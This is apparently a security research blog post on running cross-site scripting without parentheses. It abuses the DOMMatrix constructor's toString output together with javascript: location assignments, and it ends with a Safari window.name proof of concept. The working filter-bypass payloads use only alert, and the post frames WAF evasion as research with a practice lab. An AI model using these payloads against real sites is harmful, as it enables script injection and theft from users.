Every once a while, you'll find what looks like a healthy [XSS](https://portswigger.net/web-security/cross-site-scripting) vulnerability, only to bash your head against a limited charset that prevents exploitation. One common restriction is a website that doesn't let you use parenthesis: (). There are two classic solutions for this particular challenge, but both have flaws:

[location=name](http://www.thespanner.co.uk/2007/09/06/window-name-trick/) relies on an external website, and fails in Safari as it [clears window.name on x-origin navigations](https://trac.webkit.org/changeset/209076/webkit/trunk/Source).

[onerror=alert;throw 1](https://portswigger.net/research/xss-without-parentheses-and-semi-colons) is increasingly thwarted by WAFs blocking the keyword 'throw'.

Is there a third, better way? [Terjanq](https://twitter.com/terjanq) posted an interesting limited-charset challenge on [sla.ckers](https://www.reddit.com/r/Slackers/comments/ex5mmt/cool_ways_to_generate_strings_in_javascript/), and I took a break from my latest research epic (publication date TBC, no prizes for guessing why) to find the answer.

I was working with the restricted charset of `a-z A-Z';+.:=`. You can call functions using `toString/valueOf` but you can't pass arguments to the function, which makes it quite limiting. It also doesn't seem to be possible to extract parts of a string; you can only get the first character an object's toString value. For example the object `new RegExp` returns a value of `/(?:)/` and you can get the first character by using `valueOf` with `String.prototype.charAt`. This works because `charAt` gets called without any arguments and this returns the first character:

`x = new RegExp;
x.valueOf=String.prototype.charAt;
x+''//returns a single /`

Unfortunately you can't use `valueOf` with string literals, so you can't even get the first character never mind any characters in-between on a string literal. What I needed to find was a gadget that would let me generate characters that I didn't have access to. I used the [Hackability Inspector](https://portswigger-labs.net/hackability/inspector/) to enumerate the `window` object, and used the execute [JavaScript on every property feature](https://portswigger-labs.net/hackability/inspector/index.php?input=window&js=x=new%20RegExp;x.valueOf=obj[prop];console.log(prop,x%2b%27%27);) but it didn't return any useful characters. After playing around with JavaScript for a little while I realised the `new` operator could enable me to generate a bunch of new characters. Using the inspector again I came up with a script that used the [new operator on all enumerated objects](https://portswigger-labs.net/hackability/inspector/index.php?input=window&js=x=new%20obj[prop];console.log(prop,x%2b%27%27);) on `window,` and in the console I found one constructor that generated parenthesis: the DOMMatrix constructor! This constructor would generate an object that had a toString value that looked like a function call with parenthesis. For example calling the DOMMatrix constructor would generate the following:

`console.log(new DOMMatrix+'')
> matrix(1, 0, 0, 1, 0, 0)
`

In effect I could generate a string that contained parenthesis that called a function called matrix with the arguments `1,0,0,1,0,0` but there were two problems: 1) I needed to control the function called and 2) I need to control the arguments sent to the function. I could get round the first problem by simply assigning a function to the matrix variable.

`x=new DOMMatrix;
matrix=alert;
`

For the second problem I inspected the matrix object returned by the DOMMatrix constructor and noticed it had a property called "a" which would enable me to control the first argument sent to the function:

`x.a=1337;
`

Putting it all together here's how to abuse DOMMatrix to call alert(1337):

`x=new DOMMatrix;
matrix=alert;
x.a=1337;
location='javascript'+':'+x
`

You might be wondering how to execute arbitrary code. The argument sent to the matrix function has to be numeric but this isn't a problem since you could use String.fromCharCode for example to generate characters sent to a sink such as location. This is possible by overwriting the matrix variable with `String.fromCharCode` and using the `location` assignment to eval the matrix code and return the required characters. You have to use the 6 properties of the matrix object otherwise they would default to 0 or 1 which would generate syntax errors. Then you need to use a location assignment again in order to execute the generated string as JavaScript using the second location assignment.

`x=new DOMMatrix;
matrix=String.fromCharCode;
i=new DOMMatrix;
i.a=106;//j
i.b=97;//a
i.c=118;//v
i.d=97;//a
i.e=115;//s
i.f=99;//c
j=new DOMMatrix;
j.a=114;//r
j.b=105;//i
j.c=112;//p
j.d=116;//t
j.e=58;//:
j.f=32;//space
x.a=97;//a
x.b=108;//l
x.c=101;//e
x.d=114;//r
x.e=116;//t
x.f=40;//(
y=new DOMMatrix;
y.a=49;//1
y.b=51;//3
y.c=51;//3
y.d=55;//7
y.e=41;//)
y.f=59;//;
location='javascript:a='+i+'+'+j+'+'+x+'+'+y+';location=a;void 1'`

In the code above you have to use `location` twice, once to generate the characters and a second time to evaluate those characters. The `void 1` at the end returns undefined and prevents the browser from writing the second location assignment as HTML.

There is another constructor that can be used in a similar way, but we strongly suspect our blog posts are getting copy+pasted into WAF blacklists so we're keeping it to ourselves for now.

If you liked this post we have some [similar posts on this topic](https://portswigger.net/research/no-parentheses) and we also released an Academy lab that inspired the sla.ckers discussion and this blog post, so if you want to experiment with these techniques please [check out our lab](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-url-some-characters-blocked)!

Finally, I couldn't resist breaking Safari's window.name protection. Here's a [proof of concept that uses window.name on a cross origin navigation](https://portswigger-labs.net/safari_window_name_bypass/) to store a XSS payload. It works by using the target attribute to set the window name rather than JavaScript:

`<a href="http://subdomain1.portswigger-labs.net/safari_window_name_bypass/read.html" target="alert(1337)">PoC</a>`

Enjoy & stay safe!
